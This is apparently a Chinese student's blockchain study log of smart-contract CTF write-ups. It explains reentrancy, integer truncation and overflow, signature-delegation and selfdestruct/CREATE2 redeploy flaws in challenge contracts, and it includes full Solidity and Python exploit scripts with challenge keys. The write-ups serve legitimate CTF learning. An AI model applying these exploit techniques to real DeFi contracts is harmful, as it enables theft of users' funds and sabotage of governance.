---
timezone: UTC+8
---

# Cauliweak9

**GitHub ID:** Cauliweak9

**Telegram:** @暂无

## Self-introduction

深大信安协会现任区块链方向负责人，了解基础的智能合约攻击/防御手段和Web3钓鱼手段，正在学习DeFi协议合约实现以及blob相关EIP，希望能通过此次共学认识更多志同道合的人，学到更多前沿技术

## Notes

<!-- Content_START -->
# 2025-08-07

我靠昨天看完沪赛的题目睡过去了，好悬没签上到

今天稍微摆个烂，就只看1题吧，RemedyCTF的Lockdown：

> 整个题目给我眼睛都看花了，现在还是有点懵，这题能有23解是不是有点变态了（

整个题目设计了一个能质押NFT并获取质押奖励的市场和一个对应的NFT合约，同时大量使用了安全的运算函数以及重入哨兵，代码量也不小，乍看起来十分唬人

但是在Marketplace合约中，我们发现`Unstake`函数在`safeTransferFrom`后会进行`swapCUSDCforUSDC`操作，而传入的参数`recipient`（`prevOwner`）和函数中的`_iLockToken.ownerOf(tokenId)`（NFT实际持有者）可能会不一致，最后导致本应该发放给NFT持有者的奖励被发放给`prevOwner`，因此我们可以从这里开始下手

同时我们还发现Token中对`beforeTokenTransfer`的实现存在问题：如果`from`或者`to`为市场本身的时候，则不会修改`prevOwner`，因此假如我们已经让`prevOwner`获了一次利，此时我们直接再质押并取消后，就能产生双倍利润；除此之外，只有`beforeTokenTransfer`会修改`prevOwner`，因此我们需要首先进行一次带`onERC721Received`的重入操作，在第一次质押并取消的时候触发重入，让`prevOwner`修改为我们一个Alt Account，此时我们的`prevOwner`在取消质押的时候就能设置一个虚空的`_cUSDCInterest`后获取质押奖励；第2次则不需要重入，直接质押并取消即可再次获利，从而翻倍奖励

这里附上榜一大哥们公开的解题脚本，我到现在还有点懵圈所以就没有自己写QAQ

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "src/interfaces/ILockMarketplace.sol";
import "src/interfaces/ILockToken.sol";
import "src/interfaces/ICERC20.sol";
import "src/interfaces/IComptroller.sol";

interface IChallenge {
    function USDC() external returns (IERC20);
    function CUSDC() external returns (IERC20);
    function COMPTROLLER() external returns (IComptroller);
    function LOCK_MARKETPLACE() external returns (ILockMarketplace);
    function LOCK_TOKEN() external returns (ILockToken);
}

contract Proxy {
    uint256 mode;
    IChallenge public chal;
    ILockMarketplace public m;
    ILockToken public t;
    IERC20 usdc;
    address a;
    address b;
    address c;
    uint160 i;
    uint256 lastTokenId;
    
    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        t = chal.LOCK_TOKEN();
        usdc = chal.USDC();
    }

    function mintWithUSDC(address to, uint256 usdcAmount) external returns (uint256) {
        usdc.approve(address(m), usdcAmount);
        return m.mintWithUSDC(to, usdcAmount);
    }

    function stake(uint256 tokenId, uint256 usdcAmount) external {
        t.approve(address(m), tokenId);
        return m.stake(tokenId, usdcAmount);
    }

    function unStake(address to, uint256 tokenId) external {
        return m.unStake(to, tokenId);
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        t.transferFrom(from, to, tokenId);
    }

    function set_mode(uint256 _mode) external {
        mode = _mode;
    }

    function set_addr_a(address addr) external {
        a = addr;
    }

    function set_addr_b(address addr) external {
        b = addr;
    }

    function set_addr_c(address addr) external {
        c = addr;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        if (mode == 1) {
            t.transferFrom(address(this), c, tokenId);
            Proxy(c).transferFrom(address(c), a, tokenId);
        }
        lastTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function claim() external {
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));

        i += 1;
        t.transferFrom(address(this), address(uint160(address(this)) + i), lastTokenId);
    }

    function withdrawUSDC(uint256 tokenId, uint256 amount) external {
        m.withdrawUSDC(tokenId, amount);
    }

    function redeemCompoundRewards(uint256 tokenId, uint256 rewardAmount) external {
        m.redeemCompoundRewards(tokenId, rewardAmount);
    }
}

contract Exploit {
    IChallenge public chal;
    ILockMarketplace public m;
    IERC20 public usdc;
    IERC20 public cusdc;
    Proxy public a;
    Proxy public b;
    Proxy public c;

    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        usdc = chal.USDC();
        cusdc = chal.CUSDC();

        a = new Proxy(_chal);
        b = new Proxy(_chal);
        c = new Proxy(_chal);

        b.set_addr_a(address(a));
        b.set_addr_c(address(c));

        c.set_addr_a(address(a));
        c.set_addr_b(address(b));
    }

    function pwn() external {
        uint256 amount_1;
        uint256 amount_2;
        uint256 tokenId;
        uint256 tokenId2;
        uint256 tokenId3;
        uint256 c_rewards;
        uint256 m_balance;
        uint256 c_deposit;

        for (uint256 i = 0; i < 12; i++) {
            console.log("i", i);

            amount_1 = usdc.balanceOf(address(this)) - 100e6;
            if (i == 11)
                amount_1 = 364921e6 + 101e6;
            amount_2 = 100e6;

            console.log("amount_1", amount_1/1e6);

            usdc.transfer(address(a), amount_1);
            usdc.transfer(address(b), amount_2);

            tokenId = a.mintWithUSDC(address(a), amount_1);
            a.stake(tokenId, amount_1 - 20e6);

            tokenId2 = b.mintWithUSDC(address(b), amount_2);
            b.stake(tokenId2, amount_2 - 20e6);
            b.set_mode(1);
            b.unStake(address(b), tokenId2);
            b.set_mode(0);

            a.transferFrom(address(a), address(b), tokenId2);
            b.withdrawUSDC(tokenId2, m.getDeposit(tokenId2));
            b.claim();

            a.unStake(address(a), tokenId);
            a.withdrawUSDC(tokenId, m.getDeposit(tokenId));
            a.claim();

            // c should have inflated _rewardsBalance
            c_rewards = m.getAvailableRewards(address(c));
            console.log("_rewardsBalance[c]", c_rewards/1e6);

            usdc.transfer(address(c), amount_2);
            tokenId3 = c.mintWithUSDC(address(c), amount_2);
            c_deposit = m.getDeposit(tokenId3);
            if (c_deposit != 0)
                c.withdrawUSDC(tokenId3, c_deposit);
            m_balance = usdc.balanceOf(address(m));
            if (m_balance != 0)
                c.redeemCompoundRewards(tokenId3, c_rewards > m_balance ? m_balance : c_rewards);
            c.claim();

            console.log("balanceOf(this)", usdc.balanceOf(address(this))/1e6);
            console.log("usdc.balanceOf(m)", usdc.balanceOf(address(m))/1e6);
            console.log("cusdc.balanceOf(m)", cusdc.balanceOf(address(m)));
            console.log("cusdc.balanceOf(m) < 0.01e18", cusdc.balanceOf(address(m)) < 0.01e18);
        }

        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
}

contract ExploitScript is Script {
    uint256 public privateKey = 0x264dc4c5e6f74aa75583dd3e7f8784e072511ab505012e43f8bef980174b6467;
    IChallenge public chal = IChallenge(0xb5284fE2119E23c672A80Ac11B05c67D3c072eAf);

    function setUp() public {}

    function run() public {
        vm.startBroadcast(privateKey);
        Exploit e = new Exploit(chal);
        chal.USDC().transfer(address(e), 500e6);
        e.pwn();
        vm.stopBroadcast();
    }
}
```

# 2025-08-06

欸，RemedyCTF还有一个最简单的题目Rich Man's Bet，下面是Writeup（附件也不给了）

这题相比前面的Diamond Heist，合约数量大幅降低，但是作为一个治理合约这题难度也不低（虽然也是并列第3高解出的题目）

那么还是老样子，先分析一下合约内容：

- AdminNFT.sol是一个基础的ERC1155合约，这种合约支持多个代币的存储和批量转发
- Challenge.sol里面包含了我们的最终目标：完成“挑战”并且将跨链桥合约的余额全部转走（虽然这题并没有也不需要跨链），至于挑战就是非常简单的3个数学题，随便代进去几个数就做出来了
- 核心合约Bridge.sol是一个ERC1155Receiver合约，说明这个合约支持ERC1155的多代币批量转发操作，同时我们也能看到有个`onERC1155Received`，即接收到ERC1155转入的代币会自动调用该函数，同理还有个`onERC1155BatchReceived`会在接收到批量转发的代币的时候被调用 当然作为治理合约，肯定有治理逻辑，这里就是通过NFT的Power进行治理的：Admin持有的NFT的Power是10000 ether，而一般的NFT只有50 ether，而更改跨链桥设置需要所有签名人的Power大于总数的一半且都为Validator，而最终的`withdrawEth`则需要所有支持提款的总人数超过阈值（Challenge.sol设定为10）且都在初始设定的`withdrawValidator`名单中，但是很明显除了合约自己我们谁都不在名单里面...

好的，现在让我们开始做题，首先我们可以很快得到三道数学题的一组合法解，解出来后在Bridge中验证挑战即可完成`isSolved`的前面2个要求：

```Python
def main():
    # 1. Solve the 3 stages
    # Q1: 6  Q2: 59,101  Q3: 1 0 2
    print("\nSolving stages...")
    send_transaction(challenge.functions.solveStage1(6), account)
    print("\nStage 1 completed")
    send_transaction(challenge.functions.solveStage2(59, 101), account)
    print("\nStage 2 completed")
    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
    print("\nStage 3 completed")

    # 2. Verify challenge
    send_transaction(bridge.functions.verifyChallenge(), account)
    if challenge.functions.challengeSolved().call():
        print("\nChallenge verified")
    else:
        print("\nChallenge failed")
```

接下来我们进行提款，上面提到了没有人能够提款，因此我们只能尝试让threshold变为0，而唯二能更改threshold的值的地方只有constructor和`changeBridgeSettings`两个地方，也就是说我们就是得更新设置，那么我们有需要成为Validator，而能成为Validator的地方就只有两个`onERC1155(Batch)Received`了，也就是说我们就是得向Bridge转入代币...吗？

仔细查看ERC1155的实现，我们发现如果id和amount两个数组为空数组（即转入0种代币）也是会正常调用目标ERC1155Receiver的`onERC1155BatchReceived`函数的，而Bridge中并没有检测转入的代币种类是否为0，所以我们只需要转入0种代币即可：

```Python
make_validator = lambda acc: send_transaction(
    admin_nft.functions.safeBatchTransferFrom(
        acc.address, bridge.address, [], [], w3.to_bytes(text="")
    ),
    acc,
    gas=150000,
)
```

然后进入到`changeBridgeSettings`的部分，我们发现验证签名是否有效的时候只会记录`lastSigner`并和其比对，那么我们只需要有至少2个签名就能进行无限的验证，从而达到刷Power的目的，因此我们只需要再新创建一个地址并让它签一下名就行了，当然前置是需要这个地址也成为Validator；修改的设置中我们只需要修改threshold，但是这个新的threshold必须大于1...看起来没有办法，但是仔细看一下函数传入的数据类型：是一个uint256，而最后使用的threshold是一个uint96，中间进行了一次显式类型转换，也就是说如果我们传入的数很大，类型转换会产生数据丢失，比如我们传入的newThreshold是$$2^{96}$$，那么最后我们会有threshold = uint96(newThreshold) = 0

所以我们根据上面的理论更新完设置后直接withdrawEth就行了，签名列表为空就行，最后的脚本如下：（有些多余的ABI可以删掉，因为没有调用到）

```Python
# 3f716403f4394aa3c38997b1aeebed19
# [rich-mans-bet] RPC Endpoints:
# [rich-mans-bet]     - http://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main
# [rich-mans-bet]     - ws://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main/ws
#
# [rich-mans-bet] The Player private key:         0x2f24a9c9f818b1315f24eb909f85cefb6ea66bc31fc77744778acc400d6d3ba0
# [rich-mans-bet] The Challenge contract address: 0x3346B289790b9328b4661193DaEADDcD6a4a5B3a

from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_typed_data, encode_defunct
import eth_abi
import time

RPC_URL = "http://46.101.119.98:8545/emjhmdIoWPlMCHBRzbGAHdBe/main"
w3 = Web3(Web3.HTTPProvider(RPC_URL))

PRIVATE_KEY = "0xc9607d2731ff52283f710a04251fa72f9819b072cd2c44e3f5367c9ee6dbf731"
CHALLENGE_ADDRESS = "0x553c30968D4233048Bd9E2153D442ab24511960B"
account = Account.from_key(PRIVATE_KEY)

def send_transaction(contract_function, account, nonce_offset=0, value=0, gas=500000):
    """Helper function to send transactions"""
    transaction = contract_function.build_transaction(
        {
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address) + nonce_offset,
            "gas": gas,
            "maxFeePerGas": w3.eth.gas_price * 2,
            "maxPriorityFeePerGas": w3.eth.gas_price,
            "value": w3.to_wei(value, "ether"),
        }
    )
    return send_signed(transaction, account)

def send_signed(transaction, account):
    signed_txn = w3.eth.account.sign_transaction(transaction, account.key.hex())
    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def init():
    global challenge, bridge, admin_nft
    challenge = w3.eth.contract(
        address=CHALLENGE_ADDRESS,
        abi=[
            # 此处省略abi
        ],
    )

    bridge = w3.eth.contract(
        address=challenge.functions.BRIDGE().call(),
        abi=[
            # 此处省略abi
        ],
    )

    admin_nft = w3.eth.contract(
        address=challenge.functions.ADMIN_NFT().call(),
        abi=[
            # 此处省略abi
        ],
    )

def main():
    # 1. Solve the 3 stages
    # Q1: 6  Q2: 59,101  Q3: 1 0 2
    print("\nSolving stages...")
    send_transaction(challenge.functions.solveStage1(6), account)
    print("\nStage 1 completed")
    send_transaction(challenge.functions.solveStage2(59, 101), account)
    print("\nStage 2 completed")
    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
    print("\nStage 3 completed")

    # 2. Verify challenge
    send_transaction(bridge.functions.verifyChallenge(), account)
    if challenge.functions.challengeSolved().call():
        print("\nChallenge verified")
    else:
        print("\nChallenge failed")

init()
main()
# print(bridge.functions.threshold().call())
# exit(0)

print(w3.from_wei(w3.eth.get_balance(account.address), "ether"))
make_validator = lambda acc: send_transaction(
    admin_nft.functions.safeBatchTransferFrom(
        acc.address, bridge.address, [], [], w3.to_bytes(text="")
    ),
    acc,
    gas=150000,
)
new_acc = w3.eth.account.create()
print(
    send_signed(
        {
            "to": new_acc.address,
            "value": w3.to_wei("0.03", "ether"),
            "gas": 21000,
            "gasPrice": w3.to_wei("50", "gwei"),
            "chainId": w3.eth.chain_id,  # Mainnet: 1, Goerli: 5, etc.
            "nonce": w3.eth.get_transaction_count(account.address),
        },
        account,
    )
)
print(make_validator(account))
print(make_validator(new_acc))

message = eth_abi.encode(
    ["address", "address", "uint256"], [challenge.address, admin_nft.address, 2**96]
)
signed_message_a = w3.eth.account.sign_message(
    encode_defunct(message), private_key=PRIVATE_KEY
)
signed_message_b = w3.eth.account.sign_message(
    encode_defunct(message), private_key=new_acc.key
)

message_hash = message  # From step 1
receiver = account.address  # Replace with the actual receiver address
amount = 1000000000000000000  # Example amount in wei (1 ETH)
callback = Web3.to_bytes(text="example_callback_data")  # Example callback data

# Prepare the arguments
signatures = [
    signed_message_a.signature,
    signed_message_b.signature,
] * 70
print(
    send_transaction(
        bridge.functions.changeBridgeSettings(message_hash, signatures),
        account,
        gas=3000000,
    )
)

print(
    send_transaction(
        bridge.functions.withdrawEth(
            Web3.to_bytes(b"nyaaaaa".ljust(32)),
            [],
            account.address,
            w3.to_wei(1000, "ether"),
            callback,
        ),
        account,
    )
)
```

------

老传统，再接一题吧，同个比赛的题目Frozen Voting：

根据提供的题目合约，我们可以知道ADMIN在mint了一个10000票权的NFT后delegate给了我们自己，同时我们自己有一个1票权的NFT，此时我们的票权为10001；而最后的`isSolved`会尝试更换delegate并转移走10000票权的NFT，而我们的目标就是阻止这次操作

那么其实很明显了：我们唯一能做的就是在第一步更换delegate的时候做手脚，而NFT在发生所有权变更的时候一定会调用`_delegate`，而其中的`_moveDelegates`会减去上一任delegatee的票权并加到下一位那里，因此很简单：我们要想办法通过`_delegate`让自己的票权小于10000，从而触发整型下溢以实现DoS攻击

经过一点简单的代码审计，我们发现`delegateBySig`函数有点小小的问题：相比`delegate`函数，它缺少了对`delegatee`参数是否为`address(0)`的确认与操作，从而使得我们可以将自己的NFT通过`delegateBySig`函数delegate给0x0地址，而根据`_moveDelegates`函数，此时我们的票权会-1，而没有人的票权会上升（合约误以为我们销毁了NFT），因此此时我们再一次进行`delegateBySig`或者直接`transferFrom`给任意的地址即可让我们的票权达到9999，进而实现前面的目的

下面是forge的解题script：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Solve is CTFSolver {
    function solve(address challenge, address player) internal override {
        uint256 playerPrivateKey = vm.envOr(
            "PLAYER",
            uint256(
                0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
            )
        );
        Challenge ch = Challenge(challenge);
        VotingERC721 votingToken = ch.votingToken();

        address delegatee = address(0x0);
        uint256 nonce = votingToken.nonces(player);
        uint256 expiry = block.timestamp + 1 days;
        bytes32 DOMAIN_TYPEHASH = votingToken.DOMAIN_TYPEHASH();
        bytes32 DELEGATION_TYPEHASH = votingToken.DELEGATION_TYPEHASH();
        bytes32 domainSeparator = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256("VotingERC721"),
                block.chainid,
                address(votingToken)
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)
        );
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, structHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        votingToken.delegateBySig(delegatee, nonce, expiry, v, r, s);

        address account2 = address(0x1);
        votingToken.transferFrom(player, account2, 123);

        ch.isSolved();
    }
}
```

# 2025-08-05

凌晨学完，白天就不用学了（确信）

接着看看CACTF的压轴题EldoriaGate吧：

```solidity
// EldoriaGate.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
  
    "In ages past, where Eldoria's glory shone,
     Ancient gates stand, where shadows turn to dust.
     Only the proven, with deeds and might,
     May join Eldoria's hallowed, guiding light.
     Through strict trials, and offerings made,
     Eldoria's glory, is thus displayed."
  
                   ELDORIA GATES
             *_   _   _   _   _   _ *
     ^       | `_' `-' `_' `-' `_' `|       ^
     |       |                      |       |
     |  (*)  |     .___________     |  \^/  |
     | _<#>_ |    //           \    | _(#)_ |
    o+o \ / \0    ||   =====   ||   0/ \ / (=)
     0'\ ^ /\/    ||           ||   \/\ ^ /`0
       /_^_\ |    ||    ---    ||   | /_^_\
       || || |    ||           ||   | || ||
       d|_|b_T____||___________||___T_d|_|b
  
***/

import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";

contract EldoriaGate {
    EldoriaGateKernel public kernel;

    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
    event UsurperDetected(address villager, uint id, string alertMessage);
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        kernel = new EldoriaGateKernel(_secret);
    }

    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }

    function getVillagerRoles(address _villager) public view returns (string[] memory) {
        string[8] memory roleNames = [
            "SERF", 
            "PEASANT", 
            "ARTISAN", 
            "MERCHANT", 
            "KNIGHT", 
            "BARON", 
            "EARL", 
            "DUKE"
        ];

        (, , uint8 rolesBitMask) = kernel.villagers(_villager);

        uint8 count = 0;
        for (uint8 i = 0; i < 8; i++) {
            if ((rolesBitMask & (1 << i)) != 0) {
                count++;
            }
        }

        string[] memory foundRoles = new string[](count);
        uint8 index = 0;
        for (uint8 i = 0; i < 8; i++) {
            uint8 roleBit = uint8(1) << i; 
            if (kernel.hasRole(_villager, roleBit)) {
                foundRoles[index] = roleNames[i];
                index++;
            }
        }

        return foundRoles;
    }

    function checkUsurper(address _villager) external returns (bool) {
        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
        bool isUsurper = authenticated && (rolesBitMask == 0);
        emit UsurperDetected(
            _villager,
            id,
            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
        );
        return isUsurper;
    }
}


// EldoriaGateKernal.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

contract EldoriaGateKernel {
    bytes4 private eldoriaSecret;
    mapping(address => Villager) public villagers;
    address public frontend;

    uint8 public constant ROLE_SERF     = 1 << 0;
    uint8 public constant ROLE_PEASANT  = 1 << 1;
    uint8 public constant ROLE_ARTISAN  = 1 << 2;
    uint8 public constant ROLE_MERCHANT = 1 << 3;
    uint8 public constant ROLE_KNIGHT   = 1 << 4;
    uint8 public constant ROLE_BARON    = 1 << 5;
    uint8 public constant ROLE_EARL     = 1 << 6;
    uint8 public constant ROLE_DUKE     = 1 << 7;
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        eldoriaSecret = _secret;
        frontend = msg.sender;
    }

    modifier onlyFrontend() {
        assembly {
            if iszero(eq(caller(), sload(frontend.slot))) {
                revert(0, 0)
            }
        }
        _;
    }

    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
        assembly {
            let secret := sload(eldoriaSecret.slot)            
            auth := eq(shr(224, _passphrase), secret)
            mstore(0x80, auth)
            
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)
            
            let packed := sload(add(villagerSlot, 1))
            auth := mload(0x80)
            let newPacked := or(and(packed, not(0xff)), auth)
            sstore(add(villagerSlot, 1), newPacked)
        }
    }

    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
        assembly {
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)

            mstore(0x00, _unknown)
            id := keccak256(0x00, 0x20)
            sstore(villagerSlot, id)

            let storedPacked := sload(add(villagerSlot, 1))
            let storedAuth := and(storedPacked, 0xff)
            if iszero(storedAuth) { revert(0, 0) }

            let defaultRolesMask := ROLE_SERF
            roles := add(defaultRolesMask, _contribution)
            if lt(roles, defaultRolesMask) { revert(0, 0) }

            let packed := or(storedAuth, shl(8, roles))
            sstore(add(villagerSlot, 1), packed)
        }
    }

    function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) {
        assembly {
            mstore(0x0, _villager)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x0, 0x40)
        
            let packed := sload(add(villagerSlot, 1))
            let roles := and(shr(8, packed), 0xff)
            hasRoleFlag := gt(and(roles, _role), 0)
        }
    }
}


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { EldoriaGate } from "./EldoriaGate.sol";

contract Setup {
    EldoriaGate public TARGET;
    address public player;

    event DeployedTarget(address at);

    constructor(bytes4 _secret, address _player) {
        TARGET = new EldoriaGate(_secret);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public returns (bool) {
        return TARGET.checkUsurper(player);
    }
}
```

由题意我们需要使得`checkUsurper()`返回为True，而与之对应的是要让我们的role为0，其默认的值为`ROLE_SERF`即1

说句实话题目合约真没有什么能让我们交互的，因此说白了就是通过调用`enter()`来实现修改role的操作，那就让我们一步步看：

首先会进行一次`authenticate(bytes4 passphrase)`去匹配密码是否正确，而密码被存放在Kernal的Storage Slot 0处，因此我们直接用cast去获取指定存储槽内数据即可

通过认证后会调用Kernal的`evaluateIdentity`，而其中的`contribution`参数为我们发送的`msg.value`，好巧不巧Kernal中的实现里面判断role是通过`add(defaultRoleMask, _contribution)`实现的，虽然后面有`lt`小于判断，但是由于使用的是assembly，而且role是uint8数据类型，因此会存在整型溢出，所以只需要让`_contribution`为255就能让我们的role为0，从而解出本题

由于使用了非合约操作进行解题，这里就不放解题合约了，总之就是使用`cast storage --rpc-url "your rpc url" "kernal address" 0`读取Storage Slot获取密码后调用`enter{value: 255 wei}(password)`即可

暂且这样吧，明天开始复现一下那些纯Blockchain的CTF题



以防有人说我水，这里再放一个RemedyCTF最简单的题（除去签到题）Diamond Heist的Writeup，附件这里就不给出来了，6个合约杀了我吧（

这道题总共有6个合约，看起来非常恐怖，但是实际上是所有题目里面解出数第2高的（第1是签到）

- 首先分析Challenge.sol，里面的要求非常简单：获取所有的Diamond代币即可，然后初始给了自己10000 ether的HexensCoin代币，并且将所有的Diamond代币转到了Vault里
- VaultFactory.sol和名字一样，就是一个合约工厂，通过salt生成Vault合约，所以使用的是`CREATE2`操作码，至于使用的salt在Challenge.sol里面有，此处按下不表
- Diamond.sol很直白，就是一个普通的ERC20合约，知道这一点就行
- Burner.sol，一个销毁用合约，很直白
- 接下来是两个核心合约：首先来看HexensCoin.sol，这个合约也是一个ERC20合约，唯一的差别就是它添加了一个delegate机制（委托机制）：根据委托人所持有的HexensCoin数量，增加被委托人的Votes（即票数），而用户所持有的Votes数量仅在调用`_moveDelegates`函数的时候进行更新，且获取Votes仅会读取上一个Checkpoint的Votes数 但是问题就在于委托人将自己持有的HexensCoin通过transfer转移给其它用户的时候，被委托人的Votes仍旧不会发生改变（缺少了`beforeTokenTransfer`的override），因此这会导致Votes数可以刷上去，比如统一给A刷票，那首先让B调用`delegate(address(A))`后将自己的HexensCoin转给C，再让C进行delegate，以此类推
- 最后是Vault.sol，这是一个UUPS可升级代理合约，说明我们可以对这个合约进行升级，同时可以指定合约的implementation，也就是说我们可以尝试通过升级这个合约来达成恶意的操作；至于`governanceCall`我们可以通过刚刚提到的刷票方法进行调用，而`burn`的话则是可以让我们“销毁”掉Vault中所有的Diamond，至于为什么带双引号这里先卖个关子

注意看题目附件中的Challenge.py，里面说明本题区块链的分叉为Shanghai分叉，也就是说此时`selfdestruct`仍然可以在constructor以外被调用时删除合约字节码，因此我们可以销毁掉Vault再重新部署一个新的Vault并初始化，这样我们就拥有了金库的所有权；同时这个金库还可以升级为添加了恶意函数的金库，从而达成获取所有Diamond代币的目的

接下来我们回收一下伏笔：Burner自毁的操作，实际上只销毁了所有的ETH（甚至也没有，因为参数是`payable(address(this))`，也就是把ETH发送到本地址后销毁，ETH还在这个地址），而ERC20并不会随之消失，因为ERC20本质上还是一个合约，而ERC20的数量本质上也是合约的一个mapping的value，因此“被销毁的Diamond”仍然保留在创建的Burner的地址中

那么此时就到了高潮部分：已知创建Burner的时候使用的语句是new，说明使用的是CREATE操作码，而nonce是1（即Burner是Vault创建的第1个合约），所以如果我们重新创建的Vault的地址是一样的，那么创建的Burner的地址也是一样的；而创建Vault的时候使用的又是CREATE2，合约工厂地址固定、salt已知，所以我们只需要控制新创建的Vault的init_code（也就是constructor部分）一致就能保证新建的Vault一定是原先的Vault的地址

因此我们可以给原先的Vault添加2个新的函数：（`x.sol`）

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./openzeppelin-contracts/interfaces/IERC20.sol";
import "./openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";

import "./Diamond.sol";
import "./Burner2.sol";
import "./HexensCoin.sol";

contract X is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    uint public constant AUTHORITY_THRESHOLD = 100_000 ether;

    Diamond diamond;
    HexensCoin hexensCoin;

    function initialize(
        address diamond_,
        address hexensCoin_
    ) public initializer {
        __Ownable_init();
        diamond = Diamond(diamond_);
        hexensCoin = HexensCoin(hexensCoin_);
    }

    function governanceCall(bytes calldata data) external {
        require(
            msg.sender == owner() ||
                hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD
        );
        (bool success, ) = address(this).call(data);
        require(success);
    }

    function burn(address token, uint amount) external {
        require(msg.sender == owner() || msg.sender == address(this));
        Burner burner = new Burner();
        IERC20(token).transfer(address(burner), amount);
        burner.destruct();
    }

    function _authorizeUpgrade(address) internal view override {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }

    function _selfdestruct() public {
        selfdestruct(payable(address(this)));
    }

    function new_sender() public {
        Burner burner = new Burner();
        burner.destruct2(address(diamond));
        IERC20(diamond).transfer(msg.sender, 31337);
    }
}
```

我们这个恶意的Vault添加了自毁函数以方便我们重新部署合约并获得owner权限，同时添加了`new_sender`函数创建并使用我们恶意的Burner合约将“被销毁”的Diamond重新发送给恶意Vault并最终发送到我们自己手上

恶意的Burner合约如下：（`Burner2.sol`）

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Diamond.sol";

contract Burner {
    Diamond diamond;

    constructor() {}

    function destruct() external {
        selfdestruct(payable(address(this)));
    }

    function destruct2(address _diamond) external {
        diamond = Diamond(_diamond);
        diamond.transfer(msg.sender, 31337);
    }
}
```

那么至此我们的攻击路径就基本完成了：

[![0.png](https://i.postimg.cc/m2ZbdPCg/0.png)](https://postimg.cc/8s3QcPZ2)

可能有人会问：为什么要销毁再创建新的Vault？我升级后直接调用new_sender不就好了？欸，还记得CREATE操作码的nonce是什么吗？是这个合约已创建的合约数+1，也就是说如果此时调用new_sender那么nonce是2，那么我们是无法获取到Diamond的（因为压根就不在那），销毁是为了重置这个nonce，就这么简单

那么这里就给出一个（应该能够运行的）脚本吧，别被吓到了，大部分都是合约的ABI，核心逻辑在后面

```Python
from web3 import Web3
from eth_account import Account
import solcx

# Configuration
RPC_URL = "http://164.90.231.253:8545/RARSiytkQIREDxCMlQjaKzzX/main"
PRIVATE_KEY = "0x85aa8a192685c1994e222fa9abf0c5a3156d03f8da6f0712477bcd8f1d35bcd5"
CHALLENGE_ADDRESS = "0xDb95DC78E696E454bAEC14570523bba1397bF4d0"
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

def send_transaction(contract_function, account, privKey=PRIVATE_KEY):
    """Helper function to send transactions"""
    transaction = contract_function.build_transaction(
        {
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address),
            "gas": 500000,
            "maxFeePerGas": w3.eth.gas_price * 2,
            "maxPriorityFeePerGas": w3.eth.gas_price,
        }
    )

